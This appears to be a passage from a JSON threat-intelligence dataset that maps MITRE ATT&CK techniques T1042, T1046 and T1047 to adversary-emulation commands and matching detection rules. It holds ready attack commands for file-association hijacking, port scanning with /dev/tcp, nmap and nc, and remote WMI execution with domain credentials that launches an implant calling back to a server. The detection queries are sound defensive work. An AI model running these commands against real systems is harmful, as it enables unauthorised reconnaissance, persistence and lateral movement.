"((Image=\"*\\\\\\\\tshark.exe\" CommandLine=\"*-i*\") OR Image=\"*\\\\\\\\windump.exe\") | table Image,CommandLine,User,LogonGuid,Hashes,ParentProcessGuid,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ((Image=\"*\\\\\\\\tshark.exe\" CommandLine=\"*-i*\") OR Image=\"*\\\\\\\\windump.exe\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*.*\\\\tshark\\\\.exe)(?=.*.*-i.*))|.*.*\\\\windump\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "index=linux sourcetype=syslog entered promiscuous mode | table host,message", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=syslog left promiscuous mode | table host,message", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "/var/log/messages"}], "attack_paths": []}, {"commands": [{"source": "atomics/T1042/T1042.yaml", "command": "cmd.exe /c assoc #{extension_to_change}=\"C:\\Program Files\\Windows Media Player\\wmplayer.exe\"\n", "name": null}, {"source": "atomics/T1042/T1042.yaml", "command": "cmd.exe /c assoc .wav=\"C:\\Program Files\\Windows Media Player\\wmplayer.exe\"\n", "name": null}, {"source": "SysmonHunter - Change Default File Association", "command": "Windows\\Explorer.EXE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FileExts|HKCR\\\\.+\\\\shell\\\\open\\\\command", "name": null}, {"source": "SysmonHunter - Change Default File Association", "command": "assoc.exe", "name": null}], "command_list": ["cmd.exe /c assoc #{extension_to_change}=\"C:\\Program Files\\Windows Media Player\\wmplayer.exe\"\n", "cmd.exe /c assoc .wav=\"C:\\Program Files\\Windows Media Player\\wmplayer.exe\"\n", "Windows\\Explorer.EXE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FileExts|HKCR\\\\.+\\\\shell\\\\open\\\\command", "assoc.exe"], "technique_id": "T1042", "parsed_datasets": [{"Atomic Red Team Test - Change Default File Association": {"display_name": "Change Default File Association", "atomic_tests": [{"description": "Change Default File Association From cmd.exe\n", "supported_platforms": ["windows"], "name": "Change Default File Association", "input_arguments": {"target_exenstion_handler": {"default": "C:\\Program Files\\Windows Media Player\\wmplayer.exe", "type": "Path", "description": "Thing To Open"}, "extension_to_change": {"default": ".wav", "type": "String", "description": "File Extension To Hijack"}}, "executor": {"elevation_required": false, "command": "cmd.exe /c assoc #{extension_to_change}=\"#{target_exenstion_handler}\"\n", "name": "command_prompt"}}], "attack_technique": "T1042"}}, {"SysmonHunter - T1042": {"phase": "Persistence", "query": [{"process": {"image": {"pattern": "Windows\\Explorer.EXE", "op": "not"}}, "type": "reg", "reg": {"path": {"pattern": "\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FileExts|HKCR\\\\.+\\\\shell\\\\open\\\\command", "flag": "regex"}}, "op": "and"}, {"process": {"any": {"pattern": "assoc.exe"}}, "type": "process"}], "description": null, "name": "Change Default File Association", "level": "medium"}}], "queries": [{"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and (registry_key_path contains \"\\\\SOFTWARE\\\\Classes\\\\\"or registry_key_path contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\GlobalAssocChangedCounter\")", "product": "Azure Sentinel", "name": "Change Default File Association"}, {"query": "title: Change Default File Association\nid: 3d3aa6cd-6272-44d6-8afc-7e88dfef7061\nstatus: experimental\ndescription: When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections\n    are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc\n    utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1042/T1042.yaml\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n          - 'cmd'\n          - '/c'\n          - 'assoc'\n    condition: selection\nfalsepositives:\n    - Admin activity\nfields:\n    - Image\n    - CommandLine\n    - User\n    - LogonGuid\n    - Hashes\n    - ParentProcessGuid\n    - ParentCommandLine\nlevel: low\ntags:\n    - attack.persistence\n    - attack.t1042", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Change Default File Association\nid: 3d3aa6cd-6272-44d6-8afc-7e88dfef7061\nstatus: experimental\ndescription: When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections\n    are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc\n    utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1042/T1042.yaml\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n          - 'cmd'\n          - '/c'\n          - 'assoc'\n    condition: selection\nfalsepositives:\n    - Admin activity\nfields:\n    - Image\n    - CommandLine\n    - User\n    - LogonGuid\n    - Hashes\n    - ParentProcessGuid\n    - ParentCommandLine\nlevel: low\ntags:\n    - attack.persistence\n    - attack.t1042", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:*cmd* AND CommandLine.keyword:*\\\\/c* AND CommandLine.keyword:*assoc*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Change-Default-File-Association <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Change Default File Association\",\\n    \"description\": \"When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1042\"\\n    ],\\n    \"query\": \"(CommandLine.keyword:*cmd* AND CommandLine.keyword:*\\\\\\\\/c* AND CommandLine.keyword:*assoc*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:*cmd* AND CommandLine.keyword:*\\\\\\\\/c* AND CommandLine.keyword:*assoc*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Change Default File Association\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n            Image = {{_source.Image}}\\\\n      CommandLine = {{_source.CommandLine}}\\\\n             User = {{_source.User}}\\\\n        LogonGuid = {{_source.LogonGuid}}\\\\n           Hashes = {{_source.Hashes}}\\\\nParentProcessGuid = {{_source.ParentProcessGuid}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine.keyword:*cmd* AND CommandLine.keyword:*\\\\/c* AND CommandLine.keyword:*assoc*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*cmd*\" CommandLine=\"*/c*\" CommandLine=\"*assoc*\") | table Image,CommandLine,User,LogonGuid,Hashes,ParentProcessGuid,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine=\"*cmd*\" CommandLine=\"*/c*\" CommandLine=\"*assoc*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*cmd.*)(?=.*.*/c.*)(?=.*.*assoc.*))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1046/T1046.yaml", "command": "for port in {1..65535};\ndo\n  echo >/dev/tcp/192.168.1.1/$port && echo \"port $port is open\" || echo \"port $port is closed\" : ;\ndone\n", "name": null}, {"source": "atomics/T1046/T1046.yaml", "command": "nmap -sS #{network_range} -p #{port}\ntelnet 192.168.1.1 #{port}\nnc -nv 192.168.1.1 #{port}\n", "name": null}, {"source": "atomics/T1046/T1046.yaml", "command": "nmap -sS 192.168.1.0/24 -p #{port}\ntelnet 192.168.1.1 #{port}\nnc -nv 192.168.1.1 #{port}\n", "name": null}, {"source": "data/abilities/discovery/3a2ce3d5-e9e2-4344-ae23-470432ff8687.yml", "command": {"darwin": {"sh": {"command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n"}}, "linux": {"sh": {"command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n"}}}, "name": "Uses nmap to fingerprint services that were network accessible"}, {"source": "data/abilities/discovery/47abe1f5-55a5-46cc-8cad-506dac8ea6d9.yml", "command": {"darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.scan": [{"source": "remote.host.ip", "edge": "has_open_port", "target": "remote.host.port"}]}, "command": "python3 scanner.py -i #{remote.host.ip}\n", "payload": "scanner.py"}}, "linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.scan": [{"source": "remote.host.ip", "edge": "has_open_port", "target": "remote.host.port"}]}, "command": "python3 scanner.py -i #{remote.host.ip}\n", "payload": "scanner.py"}}}, "name": "Use dropped scanner to find open popular ports"}, {"source": "data/abilities/discovery/5a4cb2be-2684-4801-9355-3a90c91e0004.yml", "command": {"windows": {"psh": {"command": "$local_addr = (Get-NetIPConfiguration | Where-Object {$_.NetAdapter.Status -ne \"Disconnected\" }).IPv4Address.IPAddress;\n$temp = $local_addr.split('.')[0..2];\n$construct = $temp[0] + '.' + $temp[1] + '.' + $temp[2] + \".\";\n1..255 | % { $a = $_; write-host \"------\"; write-host \"$construct$a\";\n22,53,80,445 | % { $socket = new-object system.net.sockets.tcpclient;\n$Connection = $socket.beginconnect(\"$construct$a\", $_, $null, $null);\n$Connection.AsyncWaitHandle.waitOne(50,$false) | out-null;\nif ($socket.connected -eq $true) { echo \"Port $_ is open!\"};\n$socket.Close | Out-Null; }}\n"}}}, "name": "Scans the local network for common open ports"}, {"source": "Threat Hunting Tables", "command": "rcpping.exe -s 127.0.0.1 -t ncacn_np", "name": null}, {"source": "Threat Hunting Tables", "command": "rcpping.exe -s 127.0.0.1 -e 1234 -a privacy -u NTLM", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/recon/find_fruit", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/recon/find_fruit", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/get_sql_instance_domain", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/get_sql_instance_domain", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/get_sql_server_info", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/get_sql_server_info", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/portscan", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/portscan", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/find_fruit", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/find_fruit", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/port_scan", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/port_scan", "name": "Empire Module Command"}], "command_list": ["for port in {1..65535};\ndo\n  echo >/dev/tcp/192.168.1.1/$port && echo \"port $port is open\" || echo \"port $port is closed\" : ;\ndone\n", "nmap -sS #{network_range} -p #{port}\ntelnet 192.168.1.1 #{port}\nnc -nv 192.168.1.1 #{port}\n", "nmap -sS 192.168.1.0/24 -p #{port}\ntelnet 192.168.1.1 #{port}\nnc -nv 192.168.1.1 #{port}\n", {"darwin": {"sh": {"command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n"}}, "linux": {"sh": {"command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n"}}}, {"darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.scan": [{"source": "remote.host.ip", "edge": "has_open_port", "target": "remote.host.port"}]}, "command": "python3 scanner.py -i #{remote.host.ip}\n", "payload": "scanner.py"}}, "linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.scan": [{"source": "remote.host.ip", "edge": "has_open_port", "target": "remote.host.port"}]}, "command": "python3 scanner.py -i #{remote.host.ip}\n", "payload": "scanner.py"}}}, {"windows": {"psh": {"command": "$local_addr = (Get-NetIPConfiguration | Where-Object {$_.NetAdapter.Status -ne \"Disconnected\" }).IPv4Address.IPAddress;\n$temp = $local_addr.split('.')[0..2];\n$construct = $temp[0] + '.' + $temp[1] + '.' + $temp[2] + \".\";\n1..255 | % { $a = $_; write-host \"------\"; write-host \"$construct$a\";\n22,53,80,445 | % { $socket = new-object system.net.sockets.tcpclient;\n$Connection = $socket.beginconnect(\"$construct$a\", $_, $null, $null);\n$Connection.AsyncWaitHandle.waitOne(50,$false) | out-null;\nif ($socket.connected -eq $true) { echo \"Port $_ is open!\"};\n$socket.Close | Out-Null; }}\n"}}}, "rcpping.exe -s 127.0.0.1 -t ncacn_np", "rcpping.exe -s 127.0.0.1 -e 1234 -a privacy -u NTLM", "powershell/recon/find_fruit", "powershell/recon/find_fruit", "powershell/situational_awareness/network/get_sql_instance_domain", "powershell/situational_awareness/network/get_sql_instance_domain", "powershell/situational_awareness/network/get_sql_server_info", "powershell/situational_awareness/network/get_sql_server_info", "powershell/situational_awareness/network/portscan", "powershell/situational_awareness/network/portscan", "python/situational_awareness/network/find_fruit", "python/situational_awareness/network/find_fruit", "python/situational_awareness/network/port_scan", "python/situational_awareness/network/port_scan"], "technique_id": "T1046", "parsed_datasets": [{"Atomic Red Team Test - Network Service Scanning": {"display_name": "Network Service Scanning", "atomic_tests": [{"description": "Scan ports to check for listening ports\n", "supported_platforms": ["linux", "macos"], "name": "Port Scan", "executor": {"elevation_required": false, "command": "for port in {1..65535};\ndo\n  echo >/dev/tcp/192.168.1.1/$port && echo \"port $port is open\" || echo \"port $port is closed\" : ;\ndone\n", "name": "sh"}}, {"description": "Scan ports to check for listening ports with Nmap.\n", "supported_platforms": ["linux", "macos"], "name": "Port Scan Nmap", "input_arguments": {"host": {"default": "192.168.1.1", "type": "string", "description": "Host to scan."}, "network_range": {"default": "192.168.1.0/24", "type": "string", "description": "Network Range to Scan."}, "port": {"default": 80, "type": "string", "description": "Ports to scan."}}, "executor": {"command": "nmap -sS #{network_range} -p #{port}\ntelnet #{host} #{port}\nnc -nv #{host} #{port}\n", "name": "sh"}}], "attack_technique": "T1046"}}, {"Mitre Stockpile - Uses nmap to fingerprint services that were network accessible": {"platforms": {"darwin": {"sh": {"command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n"}}, "linux": {"sh": {"command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n"}}}, "description": "Uses nmap to fingerprint services that were network accessible", "tactic": "discovery", "technique": {"attack_id": "T1046", "name": "Network Service Scanning"}, "id": "3a2ce3d5-e9e2-4344-ae23-470432ff8687", "name": "Fingerprint network services"}}, {"Mitre Stockpile - Use dropped scanner to find open popular ports": {"platforms": {"darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.scan": [{"source": "remote.host.ip", "edge": "has_open_port", "target": "remote.host.port"}]}, "command": "python3 scanner.py -i #{remote.host.ip}\n", "payload": "scanner.py"}}, "linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.scan": [{"source": "remote.host.ip", "edge": "has_open_port", "target": "remote.host.port"}]}, "command": "python3 scanner.py -i #{remote.host.ip}\n", "payload": "scanner.py"}}}, "description": "Use dropped scanner to find open popular ports", "tactic": "discovery", "technique": {"attack_id": "T1046", "name": "Network Service Scanning"}, "id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9", "name": "Scan IP for ports"}}, {"Mitre Stockpile - Scans the local network for common open ports": {"platforms": {"windows": {"psh": {"command": "$local_addr = (Get-NetIPConfiguration | Where-Object {$_.NetAdapter.Status -ne \"Disconnected\" }).IPv4Address.IPAddress;\n$temp = $local_addr.split('.')[0..2];\n$construct = $temp[0] + '.' + $temp[1] + '.' + $temp[2] + \".\";\n1..255 | % { $a = $_; write-host \"------\"; write-host \"$construct$a\";\n22,53,80,445 | % { $socket = new-object system.net.sockets.tcpclient;\n$Connection = $socket.beginconnect(\"$construct$a\", $_, $null, $null);\n$Connection.AsyncWaitHandle.waitOne(50,$false) | out-null;\nif ($socket.connected -eq $true) { echo \"Port $_ is open!\"};\n$socket.Close | Out-Null; }}\n"}}}, "description": "Scans the local network for common open ports", "tactic": "discovery", "technique": {"attack_id": "T1046", "name": "Network Service Scanning"}, "id": "5a4cb2be-2684-4801-9355-3a90c91e0004", "name": "Network Service Scanning"}}, {"Threat Hunting Tables": {"mitre_attack": "T1046", "file_value": "", "file_path": "", "parent_process": "rcpping.exe", "itw_sample": "https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Rpcping.md", "chain_id": "100213", "registry_value": "", "mitre_caption": "network_service_scanning", "registry_path": "", "frequency": "low", "commandline_string": "-s 127.0.0.1 -t ncacn_np", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1046", "file_value": "", "file_path": "", "parent_process": "rcpping.exe", "itw_sample": "https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Rpcping.md", "chain_id": "100214", "registry_value": "", "mitre_caption": "network_service_scanning", "registry_path": "", "frequency": "low", "commandline_string": "-s 127.0.0.1 -e 1234 -a privacy -u NTLM", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1046", "Empire Module": "powershell/recon/find_fruit", "Technique": "Network Service Scanning", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/recon/find_fruit\":  [\"T1046\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1046", "Empire Module": "powershell/situational_awareness/network/get_sql_instance_domain", "Technique": "Network Service Scanning", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/get_sql_instance_domain\":  [\"T1046\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1046", "Empire Module": "powershell/situational_awareness/network/get_sql_server_info", "Technique": "Network Service Scanning", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/get_sql_server_info\":  [\"T1046\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1046", "Empire Module": "powershell/situational_awareness/network/portscan", "Technique": "Network Service Scanning", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/portscan\":  [\"T1046\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1046", "Empire Module": "python/situational_awareness/network/find_fruit", "Technique": "Network Service Scanning", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/find_fruit\":  [\"T1046\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1046", "Empire Module": "python/situational_awareness/network/port_scan", "Technique": "Network Service Scanning", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/port_scan\":  [\"T1046\"],"}}, {"0xtf/nsm-attack": {"Rules": "ET Open", "SID": "*", "Verified": "Yes", "Signature": "ET SCAN *"}}, {"0xtf/nsm-attack": {"Rules": "ET Open", "SID": "*", "Verified": "Yes", "Signature": "GPL SCAN *"}}], "queries": [{"query": "title: Java Running with Remote Debugging\nid: 8f88e3f6-2a49-48f5-a5c4-2f7eedf78710\ndescription: Detects a JAVA process running with remote debugging allowing more than just localhost to connect\nauthor: Florian Roth\ntags:\n    - attack.discovery\n    - attack.t1046\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: '*transport=dt_socket,address=*'\n    exclusion:\n        - CommandLine: '*address=127.0.0.1*'\n        - CommandLine: '*address=localhost*'\n    condition: selection and not exclusion\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Java Running with Remote Debugging\nid: 8f88e3f6-2a49-48f5-a5c4-2f7eedf78710\ndescription: Detects a JAVA process running with remote debugging allowing more than just localhost to connect\nauthor: Florian Roth\ntags:\n    - attack.discovery\n    - attack.t1046\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: '*transport=dt_socket,address=*'\n    exclusion:\n        - CommandLine: '*address=127.0.0.1*'\n        - CommandLine: '*address=localhost*'\n    condition: selection and not exclusion\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:*transport\\\\=dt_socket,address\\\\=* AND (NOT (CommandLine.keyword:*address\\\\=127.0.0.1* OR CommandLine.keyword:*address\\\\=localhost*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Java-Running-with-Remote-Debugging <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Java Running with Remote Debugging\",\\n    \"description\": \"Detects a JAVA process running with remote debugging allowing more than just localhost to connect\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.t1046\"\\n    ],\\n    \"query\": \"(CommandLine.keyword:*transport\\\\\\\\=dt_socket,address\\\\\\\\=* AND (NOT (CommandLine.keyword:*address\\\\\\\\=127.0.0.1* OR CommandLine.keyword:*address\\\\\\\\=localhost*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:*transport\\\\\\\\=dt_socket,address\\\\\\\\=* AND (NOT (CommandLine.keyword:*address\\\\\\\\=127.0.0.1* OR CommandLine.keyword:*address\\\\\\\\=localhost*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Java Running with Remote Debugging\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine.keyword:*transport=dt_socket,address=* AND (NOT (CommandLine.keyword:*address=127.0.0.1* OR CommandLine.keyword:*address=localhost*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*transport=dt_socket,address=*\" NOT (CommandLine=\"*address=127.0.0.1*\" OR CommandLine=\"*address=localhost*\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine=\"*transport=dt_socket,address=*\"  -(CommandLine=\"*address=127.0.0.1*\" OR CommandLine=\"*address=localhost*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*transport=dt_socket,address=.*)(?=.*(?!.*(?:.*(?:.*(?=.*.*address=127\\\\.0\\\\.0\\\\.1.*)|.*(?=.*.*address=localhost.*))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "ET SCAN *", "product": "Suricata (NSM)", "name": "ET Open Rule"}, {"query": "GPL SCAN *", "product": "Suricata (NSM)", "name": "ET Open Rule"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1047/T1047.yaml", "command": "wmic useraccount get /ALL\n", "name": null}, {"source": "atomics/T1047/T1047.yaml", "command": "wmic process get caption,executablepath,commandline\n", "name": null}, {"source": "atomics/T1047/T1047.yaml", "command": "wmic qfe get description,installedOn /format:csv\n", "name": null}, {"source": "atomics/T1047/T1047.yaml", "command": "wmic /node:\"192.168.0.1\" service where (caption like \"%#{service_search_string} (%\")\n", "name": null}, {"source": "atomics/T1047/T1047.yaml", "command": "wmic /node:\"192.168.0.1\" service where (caption like \"%sql server (%\")\n", "name": null}, {"source": "atomics/T1047/T1047.yaml", "command": "wmic process call create calc.exe\n", "name": null}, {"source": "atomics/T1047/T1047.yaml", "command": "wmic /node:\"192.168.0.1\" process call create #{process_to_execute}\n", "name": null}, {"source": "atomics/T1047/T1047.yaml", "command": "wmic /node:\"192.168.0.1\" process call create calc.exe\n", "name": null}, {"source": "data/abilities/collection/94f21386-9547-43c4-99df-938ab05d45ce.yml", "command": {"windows": {"psh": {"command": "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"}}}, "name": "Capture process id, executable path, pid and parent pid before writing to disk"}, {"source": "data/abilities/execution/2a32e46f-5346-45d3-9475-52b857c05342.yml", "command": {"windows": {"psh": {"command": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"powershell.exe C:\\Users\\Public\\svchost.exe -server #{server} -executors psh\";\n"}, "cmd": {"command": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"cmd.exe /c C:\\Users\\Public\\svchost.exe -server #{server} -executors cmd\";\n"}}}, "name": "Remotely executes 54ndc47 over WMI"}, {"source": "data/abilities/lateral-movement/ece5dde3-d370-4c20-b213-a1f424aa8d03.yml", "command": {"windows": {"psh": {"cleanup": "wmic /node:`\"#{remote.host.fqdn}`\" /user:#{domain.user.name} /password:#{domain.user.password} process call create \"taskkill /f /im s4ndc4t.exe\"\n", "command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:#{domain.user.name} /password:#{domain.user.password} process call create \"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group} -executors psh\";\n"}}}, "name": "Remotely executes 54ndc47 over WMI"}, {"source": "Threat Hunting Tables", "command": "wmic.exe /NODE:*process call create*", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe /NODE:*path AntiVirusProduct get*", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe /NODE:*path FirewallProduct get*", "name": null}, {"source": "Threat Hunting Tables", "command": "WmiPrvSE.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "wmic.exe /NODE: \"192.168.0.1\" process call create \"*.exe\"", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create \"at 9:00PM <path> ^> <path>\"", "name": null}, {"source": "Threat Hunting Tables", "command": 